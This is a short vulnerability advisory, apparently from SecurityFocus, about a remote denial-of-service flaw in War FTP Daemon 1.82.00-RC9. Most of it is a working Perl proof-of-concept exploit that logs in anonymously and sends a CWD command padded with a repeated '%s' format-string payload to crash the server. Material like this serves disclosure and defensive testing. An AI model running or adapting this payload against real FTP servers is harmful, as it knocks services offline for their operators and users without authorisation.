source: http://www.securityfocus.com/bid/12384/info

War FTP Daemon is reported prone to a remote denial of service vulnerability. This issue arises because the application fails to handle exceptional conditions in a proper manner.

War FTP Daemon 1.82.00-RC9 is reported prone to this issue. It is likely that previous versions are vulnerable as well.

#!/usr/bin/perl -w
# remote DoS PoC Exploit for WarFTPD 1.82 RC9
# THX 2 barabas 4 his GoldenFTP-sploit :)
# greetings fly out to Foobar

use strict;
use Net::FTP;
my $payload="%s"x115;

my $ftp = Net::FTP->new("127.0.0.1", Debug => 1);
$ftp->login("anonymous","123@123.com");
$ftp->quot("CWD",$payload);

